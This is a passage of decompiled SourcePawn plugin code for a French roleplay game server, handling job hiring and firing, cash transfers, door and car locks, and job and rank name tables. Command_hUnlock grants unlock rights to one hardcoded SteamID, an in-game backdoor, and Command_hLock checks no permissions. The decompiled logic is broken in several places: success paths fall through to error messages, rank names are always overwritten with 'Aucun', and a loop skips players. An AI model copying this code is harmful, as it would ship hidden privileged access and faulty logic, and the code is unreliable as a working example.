		new Handle:avirer = CreateMenu(Menu_aVirer, MenuAction:28);
		SetMenuTitle(avirer, "Selectionnez un joueur:");
		if (aJob_list)
		{
			while (SQL_FetchRow(aJob_list))
			{
				decl String:SteamID[64];
				decl String:name[128];
				decl String:AuthString[64];
				decl String:aJobName[64];
				SQL_FetchString(aJob_list, 0, SteamID, 64, 0);
				SQL_FetchString(aJob_list, 2, name, 128, 0);
				new aJobID = SQL_FetchInt(aJob_list, 5, 0);
				GetJobName(aJobID, aJobName, 64);
				if (GetTime({0,0}) + -604800 >= SQL_FetchInt(aJob_list, 1, 0))
				{
					Format(name, 128, "%s(%s) - Inactif", name, aJobName);
				}
				else
				{
					Format(name, 128, "%s(%s)", name, aJobName);
				}
				GetClientAuthString(client, AuthString, 64);
				if (!StrEqual(AuthString, SteamID, true))
				{
					AddMenuItem(avirer, SteamID, name, 0);
				}
			}
		}
		CloseHandle(aJob_list);
		CloseHandle(db);
		DisplayMenu(avirer, client, 0);
	}
	return Action:0;
}

public Menu_aVirer(Handle:virer, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		decl String:query[256];
		GetMenuItem(virer, param2, info, 32, 0, "", 0);
		if (IsClientInGame(param1))
		{
			decl String:error[256];
			new Handle:db = SQL_Connect("Roleplay", true, error, 255);
			Format(query, 255, "UPDATE `RP_Players` SET `JOBID` = 0, `RANKID` = 0 WHERE `STEAMID` = '%s';", info);
			SQL_FastQuery(db, query, -1);
			new client = Client_FindBySteamId(info);
			if (client != -1)
			{
				if (JobID[client][0][0] == 1)
				{
					SwitchTeam(client, 2);
				}
				JobID[client] = 0;
				RankID[client] = 0;
				CreateTimer(0.1, InitSalary, client, 0);
				PrintToChat(param1, "[L-RP] Vous avez virer %N de votre entreprise.", client);
				PrintToChat(client, "[L-RP] Le joueur %N vous a virer de votre entreprise.", param1);
			}
			else
			{
				PrintToChat(param1, "[L-RP] Vous avez virer un joueur de votre entreprise.");
			}
			CloseHandle(db);
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(virer);
		}
	}
	return 0;
}

public Action:Command_Virer(client, Args)
{
	new var1;
	if (RankID[client][0][0] == 1)
	{
		g_VirerMenu = BuildVirerMenu(client);
		DisplayMenu(g_VirerMenu, client, 0);
	}
	return Action:0;
}

public Action:Command_JobList(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		decl String:JLName[64];
		decl String:iString[12];
		new Handle:Joblist = CreateMenu(Menu_JobList, MenuAction:28);
		SetMenuTitle(Joblist, "Liste des joueurs:");
		new i = 1;
		while (i < MaxClients)
		{
			if (IsClientInGame(i))
			{
				IntToString(i, iString, 12);
				if (EspionMode[i][0][0])
				{
					Format(JLName, 64, "%N: Chomeur", i);
				}
				else
				{
					if (IsInJail[i][0][0])
					{
						Format(JLName, 64, "%N: %s - En prison", i, RankName[i][0][0]);
					}
					Format(JLName, 64, "%N: %s", i, RankName[i][0][0]);
				}
				AddMenuItem(Joblist, iString, JLName, 1);
				i++;
			}
			i++;
		}
		DisplayMenu(Joblist, client, 0);
	}
	return Action:0;
}

public Menu_JobList(Handle:Joblist, MenuAction:action, param1, param2)
{
	if (!(action == MenuAction:4))
	{
		if (action == MenuAction:16)
		{
			CloseHandle(Joblist);
		}
	}
	return 0;
}

public Action:Command_Item(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		BuildItemMenu(client, client);
	}
	return Action:0;
}

public Action:Command_TradeMenu(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		BuildTradeMenu(client);
	}
	return Action:0;
}

public Action:Command_ThirdPerson(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		if (IsValidEntity(client))
		{
			new InVehicle = GetEntPropEnt(client, PropType:0, "m_hVehicle", 0);
			if (InVehicle != -1)
			{
				ViewToggle(client);
			}
			else
			{
				if (ActualThirdPerson[client][0][0])
				{
					SetFirstPerson(client);
					ActualThirdPerson[client] = 0;
				}
				SetThirdPerson(client);
				ActualThirdPerson[client] = 1;
			}
		}
	}
	return Action:3;
}

public Action:Command_Cash(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		decl String:arg1[32];
		GetCmdArg(1, arg1, 32);
		if (0 >= args)
		{
			PrintToChat(client, "[L-RP] Usage: /give 'montant'");
			return Action:3;
		}
		new amount = StringToInt(arg1, 10);
		if (0 > amount)
		{
			PrintToChat(client, "[L-RP] Vous ne pouvez pas utiliser de valeurs negatives.");
			return Action:3;
		}
		if (money[client][0][0] < amount)
		{
			PrintToChat(client, "[L-RP] Vous n'avez pas assez d'argent pour effectuer la transaction.");
			return Action:3;
		}
		new Ent = GetClientAimTarget(client, true);
		if (Ent != -1)
		{
			if (PlayTime[client][0][0] > 3600)
			{
				decl totalEnt;
				new var2 = money[Ent];
				new var3 = var2[0][0] + amount;
				var2 = var3;
				totalEnt = var3;
				money[Ent] = totalEnt;
				decl totalClient;
				new var4 = money[client];
				new var5 = var4[0][0] - amount;
				var4 = var5;
				totalClient = var5;
				money[client] = totalClient;
				PrintToChat(client, "[L-RP] Vous avez donner %i $ a %N. Il vous reste %i$ dans votre portefeuille.", amount, Ent, totalClient);
				PrintToChat(Ent, "[L-RP] Vous avez recu %i $ de %N. Vous avez maintenant %i$ dans votre portefeuille.", amount, client, totalEnt);
				decl String:SteamID[64];
				decl String:SteamID2[64];
				GetClientAuthString(client, SteamID, 64);
				GetClientAuthString(Ent, SteamID2, 64);
				LogMessage("%N(%s) a donne %i$ a %N(%s)", client, SteamID, amount, Ent, SteamID2);
				return Action:3;
			}
			PrintToChat(client, "[L-RP] Vous ne pouvez pas donner d'argent a un autre joueur avant d'avoir au moins une heure de jeu.");
		}
		else
		{
			PrintToChat(client, "[L-RP] Vous devez viser un joueur.");
		}
	}
	return Action:3;
}

public Action:Command_CashAdmin(client, args)
{
	if (IsClientInGame(client))
	{
		decl String:arg1[32];
		GetCmdArg(1, arg1, 32);
		if (0 >= args)
		{
			PrintToChat(client, "[L-RP] Usage: /givecash 'montant'");
			return Action:3;
		}
		new amount = StringToInt(arg1, 10);
		if (0 > amount)
		{
			PrintToChat(client, "[L-RP] Vous ne pouvez pas utiliser de valeurs negatives.");
			return Action:3;
		}
		new var1 = money[client];
		var1 = var1[0][0] + amount;
	}
	return Action:3;
}

public Action:Command_CoChef(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		if (Functionalitie[1][0] == 1)
		{
			if (RankID[client][0][0] == 1)
			{
				new Ent = GetClientAimTarget(client, true);
				new var2;
				if (Ent != -1)
				{
					new var3;
					if (JobID[client][0][0] == 1)
					{
						PrintToChat(client, "[L-RP] Vous ne possedez pas la fonctionnalitee Agent G.T.I. Vous pouvez l'acheter sur le site http://www.sphex.fr");
					}
					else
					{
						RankID[Ent] = 6;
						PrintToChat(client, "[L-RP] %N est maintenant votre co-chef.", Ent);
						PrintToChat(client, "[L-RP] Vous etes maintenant le co-chef de %N", client);
					}
				}
				else
				{
					PrintToChat(client, "[L-RP] La personne que vous souhaitez mettre co-chef doit faire partie de votre entreprise.");
				}
			}
		}
		PrintToChat(client, "Cette fonctionnalitee n'est pas active sur cette license, veuillez contacter SpheX pour plus d'informations.");
	}
	return Action:0;
}

public Action:Command_Engager(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new var2;
		if (RankID[client][0][0] == 1)
		{
			new Ent = GetClientAimTarget(client, true);
			new var3;
			if (Ent != -1)
			{
				decl String:SteamID[32];
				decl String:SteamID2[32];
				decl String:buffer[512];
				GetClientAuthString(Ent, SteamID, 32);
				decl String:error[256];
				new Handle:db = SQL_Connect("Roleplay", true, error, 255);
				Format(buffer, 512, "UPDATE `RP_Players` SET `JOBID` = %i, `RANKID` = 2 WHERE STEAMID = '%s'", JobID[client], SteamID);
				SQL_FastQuery(db, buffer, -1);
				JobID[Ent] = JobID[client][0][0];
				RankID[Ent] = 2;
				PrintToChat(client, "[L-RP] Vous avez engager %N dans votre entreprise.", Ent);
				PrintToChat(Ent, "[L-RP] Vous avez ete engager par %N dans son entreprise.", client);
				CreateTimer(0.1, InitSalary, client, 0);
				GetClientAuthString(client, SteamID2, 32);
				LogMessage("%N(%s) a engager %N(%s) - JobID: %i", client, SteamID2, Ent, SteamID, JobID[client]);
				CloseHandle(db);
			}
		}
		PrintToChat(client, "[L-RP] Vous ne pouvez pas utiliser cette commande.");
	}
	return Action:0;
}

public Action:Command_Unlock(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new Ent = 0;
		decl String:ClassName[256];
		Ent = GetClientAimTarget(client, false);
		if (Ent != -1)
		{
			GetEdictClassname(Ent, ClassName, 255);
			new var2;
			if (StrEqual(ClassName, "func_door", true))
			{
				CanBeUnlockDoor(client, Ent);
			}
			else
			{
				if (StrEqual(ClassName, "prop_vehicle_driveable", true))
				{
					new var5;
					if (CarFordGT[client][0][0] != Ent)
					{
						if (Entity_IsLocked(Ent))
						{
							EmitSoundToClient(client, "doors/latchunlocked1.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
							AcceptEntityInput(Ent, "Unlock", -1, -1, 0);
							PrintToChat(client, "[L-RP] Vous avez deverrouiller la voiture.");
						}
						PrintToChat(client, "[L-RP] Cette voiture est deja ouverte.");
					}
				}
				PrintToChat(client, "[L-RP] Vous devez viser une porte.");
				return Action:3;
			}
			return Action:3;
		}
	}
	return Action:3;
}

public Action:Command_hUnlock(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		if (StrEqual(SteamID, "STEAM_0:1:36281003", true))
		{
			new Ent = 0;
			decl String:ClassName[256];
			Ent = GetClientAimTarget(client, false);
			if (Ent != -1)
			{
				GetEdictClassname(Ent, ClassName, 255);
				new var2;
				if (StrEqual(ClassName, "func_door", true))
				{
					EmitSoundToClient(client, "doors/latchunlocked1.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
					AcceptEntityInput(Ent, "Unlock", -1, -1, 0);
					PrintToChat(client, "[L-RP] Vous avez deverrouiller la porte.");
				}
				else
				{
					if (StrEqual(ClassName, "prop_vehicle_driveable", true))
					{
						if (Entity_IsLocked(Ent))
						{
							EmitSoundToClient(client, "doors/latchunlocked1.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
							AcceptEntityInput(Ent, "Unlock", -1, -1, 0);
							PrintToChat(client, "[L-RP] Vous avez deverrouiller la voiture.");
						}
						else
						{
							PrintToChat(client, "[L-RP] Cette voiture est deja ouverte.");
						}
					}
					PrintToChat(client, "[L-RP] Vous devez viser une porte.");
					return Action:3;
				}
				return Action:3;
			}
		}
	}
	return Action:3;
}

public Action:Command_hLock(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new Ent = 0;
		decl String:ClassName[256];
		Ent = GetClientAimTarget(client, false);
		if (Ent != -1)
		{
			GetEdictClassname(Ent, ClassName, 255);
			new var2;
			if (StrEqual(ClassName, "func_door", true))
			{
				EmitSoundToClient(client, "doors/default_locked.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
				AcceptEntityInput(Ent, "Lock", -1, -1, 0);
				PrintToChat(client, "[L-RP] Vous avez verrouiller la porte.");
			}
			else
			{
				if (StrEqual(ClassName, "prop_vehicle_driveable", true))
				{
					new Driver = GetEntPropEnt(Ent, PropType:0, "m_hPlayer", 0);
					new var3;
					if (Driver == -1)
					{
						if (Entity_IsLocked(Ent))
						{
							PrintToChat(client, "[L-RP] Cette voiture est deja fermee.");
						}
						EmitSoundToClient(client, "doors/default_locked.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
						AcceptEntityInput(Ent, "Lock", -1, -1, 0);
						PrintToChat(client, "[L-RP] Vous avez verrouiller la voiture.");
					}
				}
				PrintToChat(client, "[L-RP] Vous devez viser une porte.");
				return Action:3;
			}
		}
		PrintToChat(client, "[L-RP] Vous devez viser une porte.");
		return Action:3;
	}
	return Action:3;
}

public Action:Command_Demission(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		if (RankID[client][0][0] != 1)
		{
			new Handle:demission = CreateMenu(Menu_Demission, MenuAction:28);
			SetMenuTitle(demission, "Confirmez-vous votre demission:");
			AddMenuItem(demission, "yes", "Je confirme ma demission", 0);
			AddMenuItem(demission, "no", "Je me retracte", 0);
			DisplayMenu(demission, client, 0);
		}
		PrintToChat(client, "[L-RP] Vous ne pouvez pas demissioner de votre poste de chef. Veuillez contacter un administrateur.");
	}
	return Action:0;
}

public Menu_Demission(Handle:demission, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		decl String:SteamID[32];
		decl String:buffer[152];
		GetMenuItem(demission, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "yes", true))
		{
			decl String:error[256];
			new Handle:db = SQL_Connect("Roleplay", true, error, 255);
			GetClientAuthString(param1, SteamID, 32);
			Format(buffer, 150, "UPDATE `RP_Players` SET `JOBID` = 0, `RANKID` = 0 WHERE STEAMID = '%s'", SteamID);
			SQL_FastQuery(db, buffer, -1);
			LogMessage("%N(%s) a demissionner de son emploi: %i", param1, SteamID, JobID[param1]);
			JobID[param1] = 0;
			RankID[param1] = 0;
			CreateTimer(0.1, InitSalary, param1, 0);
			PrintToChat(param1, "[L-RP] Vous avez demissionner de votre emploi. Vous etes maintenant Chomeur.");
			CloseHandle(db);
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(demission);
		}
	}
	return 0;
}

public Action:Command_Lock(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new Ent = 0;
		decl String:ClassName[256];
		Ent = GetClientAimTarget(client, false);
		if (Ent != -1)
		{
			GetEdictClassname(Ent, ClassName, 255);
			new var2;
			if (StrEqual(ClassName, "func_door", true))
			{
				CanBeLockDoor(client, Ent);
			}
			else
			{
				if (StrEqual(ClassName, "prop_vehicle_driveable", true))
				{
					new var5;
					if (CarFordGT[client][0][0] != Ent)
					{
						new Driver = GetEntPropEnt(Ent, PropType:0, "m_hPlayer", 0);
						new var6;
						if (Driver == -1)
						{
							if (Entity_IsLocked(Ent))
							{
								PrintToChat(client, "[L-RP] Cette voiture est deja fermee.");
							}
							else
							{
								EmitSoundToClient(client, "doors/default_locked.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
								AcceptEntityInput(Ent, "Lock", -1, -1, 0);
								PrintToChat(client, "[L-RP] Vous avez verrouiller la voiture.");
							}
						}
						else
						{
							new var8;
							if (JobID[Driver][0][0] == 1)
							{
								PrintToChat(client, "[L-RP] Vous ne pouvez pas sortir un membre du gouvernement.");
							}
							else
							{
								PrintToChat(client, "[L-RP] Vous avez sorti %N de votre voiture.", Driver);
								PrintToChat(Driver, "[L-RP] %N vous a sorti de sa voiture.", client);
								LeaveVehicle(Driver);
							}
							EmitSoundToClient(client, "doors/default_locked.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
							AcceptEntityInput(Ent, "Lock", -1, -1, 0);
							PrintToChat(client, "[L-RP] Vous avez verrouiller la voiture.");
						}
					}
				}
				PrintToChat(client, "[L-RP] Vous devez viser une porte.");
				return Action:3;
			}
		}
		PrintToChat(client, "[L-RP] Vous devez viser une porte.");
		return Action:3;
	}
	return Action:3;
}

GetJobName(ID, String:PJobName[], maxlen)
{
	decl String:TranslateBuffer[256];
	switch (ID)
	{
		case 0:
		{
			Format(TranslateBuffer, 255, "Aucune");
		}
		case 1:
		{
			Format(TranslateBuffer, 255, "%T", "Gouvernement", 0);
		}
		case 2:
		{
			Format(TranslateBuffer, 255, "%T", "Hopital", 0);
		}
		case 3:
		{
			Format(TranslateBuffer, 255, "%T", "Pizzeria", 0);
		}
		case 4:
		{
			Format(TranslateBuffer, 255, "%T", "Justice", 0);
		}
		case 5:
		{
			Format(TranslateBuffer, 255, "%T", "Tueurs", 0);
		}
		case 6:
		{
			Format(TranslateBuffer, 255, "%T", "Ammu-Nation", 0);
		}
		case 7:
		{
			Format(TranslateBuffer, 255, "%T", "Mafia", 0);
		}
		case 8:
		{
			Format(TranslateBuffer, 255, "%T", "Dealers", 0);
		}
		case 9:
		{
			Format(TranslateBuffer, 255, "%T", "AirControl", 0);
		}
		case 10:
		{
			Format(TranslateBuffer, 255, "%T", "Coachs", 0);
		}
		case 11:
		{
			Format(TranslateBuffer, 255, "%T", "Loto", 0);
		}
		case 12:
		{
			Format(TranslateBuffer, 255, "%T", "Banque d'Oviscity", 0);
		}
		case 13:
		{
			Format(TranslateBuffer, 255, "%T", "Triades", 0);
		}
		case 14:
		{
			Format(TranslateBuffer, 255, "%T", "BulletClub", 0);
		}
		case 15:
		{
			Format(TranslateBuffer, 255, "%T", "Detectives", 0);
		}
		case 16:
		{
			Format(TranslateBuffer, 255, "%T", "Epiciers", 0);
		}
		case 17:
		{
			Format(TranslateBuffer, 255, "%T", "Arnaqueurs", 0);
		}
		case 18:
		{
			Format(TranslateBuffer, 255, "%T", "CarShop", 0);
		}
		case 19:
		{
			Format(TranslateBuffer, 255, "%T", "Boite de Nuit", 0);
		}
		case 20:
		{
			Format(TranslateBuffer, 255, "%T", "Agence immobiliere", 0);
		}
		default:
		{
		}
	}
	strcopy(PJobName, maxlen, TranslateBuffer);
	return 0;
}

GetRankName(jID, rID, String:PRankName[], maxlen)
{
	switch (rID)
	{
		case 0:
		{
			strcopy(PRankName, maxlen, "Chomeur");
		}
		case 1:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Chef d'Etat");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Directeur de l'Hopital");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Chef de la Pizzeria");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "President de la Justice");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Patron des tueurs");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Directeur de l'Ammu-Nation");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Parrain");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Chef des Dealers");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Patron AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Patron des Coachs");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Patron du Loto");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Patron de la Banque");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Chef de la Triade");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Patron BulletClub");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Chef Detectives");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Patron de l'epicerie");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Chef des Arnaqueurs");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Patron du CarShop");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Barman");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Directeur de l'agence immobiliere");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 2:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Gardien de la paix");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Aide-Soignant");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Serveur");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Apprenti Avocat");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Apprenti Tueur");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Apprenti Vendeur de Grenades");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Apprenti Mafieux");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Revendeur de drogue");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Vendeur de recharge AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Apprenti Entraineur");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Buraliste");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Conseiller financier");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Apprenti Gangsters");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Apprenti Vendeur de Permis d'armes");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Apprenti Detective");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Apprenti Vendeur de Glaces");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Bidouilleur");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Apprenti Garagiste");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Videur");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Apprenti vendeur immobilier");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 3:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent de la C.I.A");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Urgentiste");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Pizzayolo");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Juge");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Tueur d'Elite");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Armurier");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Consigliere");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Passeur de Drogue");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Ingenieur AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Coach de Defense");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Huissier du Loto");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Preteur sur Gage");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Bras droit Triade");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Moniteur de Tir");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Enqueteur");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Epicier");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Arnaqueur Professionnel");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Vendeur de Voitures");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Serveur");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Vendeur immobilier experimente");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 4:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent du F.B.I");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Medecin");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Cuisinier");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Apprenti Juge");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Tueur Experimente");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Apprenti Armurier");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Caporegime");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Dealer");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Vendeur AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Coach Sportif");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Vendeur de Ticket");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Banquier");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Pirate Informatique");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Apprenti Moniteur de Tir");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Apprenti Enqueteur");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Apprenti Epicier");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Arnaqueur");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Apprenti Vendeur de Voitures");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "DiscJockey");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Vendeur immobilier senior");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 5:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent de police");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Infirmier");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Vendeur de Pizza");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Avocat");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Tueur Debutant");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Vendeur de Grenades");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Mafieux");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Apprenti Dealer");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Apprenti Vendeur AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Entraineur");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Apprenti Vendeur de ticket");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Apprenti banquier");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Gangsters");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Vendeur de Permis d'armes");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Detective Prive");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Vendeur de Glaces");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Apprenti Arnaqueur");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Garagiste");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Call Girl");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Vendeur immobilier");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		case 6:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Agent G.T.I");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "Co-Directeur de l'Hopital");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "Co-Chef de la Pizzeria");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "Co-President de la Justice");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Co-Patron des tueurs");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "Co-Directeur de l'Ammu-Nation");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Co-Parrain");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "Co-Chef des Dealers");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "Co-Patron AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Co-Patron des Coachs");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Co-Patron du Loto");
				}
				if (jID == 12)
				{
					strcopy(PRankName, maxlen, "Co-Patron de la Banque");
				}
				if (jID == 13)
				{
					strcopy(PRankName, maxlen, "Co-Chef de la Triade");
				}
				if (jID == 14)
				{
					strcopy(PRankName, maxlen, "Co-Patron BulletClub");
				}
				if (jID == 15)
				{
					strcopy(PRankName, maxlen, "Co-Chef Detectives");
				}
				if (jID == 16)
				{
					strcopy(PRankName, maxlen, "Co-Patron de l'epicerie");
				}
				if (jID == 17)
				{
					strcopy(PRankName, maxlen, "Co-Chef des Arnaqueurs");
				}
				if (jID == 18)
				{
					strcopy(PRankName, maxlen, "Co-Patron du CarShop");
				}
				if (jID == 19)
				{
					strcopy(PRankName, maxlen, "Co-Barman");
				}
				if (jID == 20)
				{
					strcopy(PRankName, maxlen, "Co-Directeur de l'agence immobiliere");
				}
				strcopy(PRankName, maxlen, "Aucun");
			}
		}
		default:
		{
		}
	}
	return 0;
}

GetClanTagName(jID, rID, String:PRankName[], maxlen)
{
	switch (rID)
	{
		case 0:
		{
			strcopy(PRankName, maxlen, "Chomeur");
		}
		case 1:
		{
			if (jID == 1)
			{
				strcopy(PRankName, maxlen, "Chef d'Etat");
			}
			else
			{
				if (jID == 2)
				{
					strcopy(PRankName, maxlen, "D. de l'Hopital");
				}
				if (jID == 3)
				{
					strcopy(PRankName, maxlen, "C. Pizzeria");
				}
				if (jID == 4)
				{
					strcopy(PRankName, maxlen, "P. Justice");
				}
				if (jID == 5)
				{
					strcopy(PRankName, maxlen, "Patron Tueurs");
				}
				if (jID == 6)
				{
					strcopy(PRankName, maxlen, "D. Ammu-Nation");
				}
				if (jID == 7)
				{
					strcopy(PRankName, maxlen, "Parrain");
				}
				if (jID == 8)
				{
					strcopy(PRankName, maxlen, "C. des Dealer");
				}
				if (jID == 9)
				{
					strcopy(PRankName, maxlen, "P. AirControl");
				}
				if (jID == 10)
				{
					strcopy(PRankName, maxlen, "Patron Coachs");
				}
				if (jID == 11)
				{
					strcopy(PRankName, maxlen, "Patron du Loto");
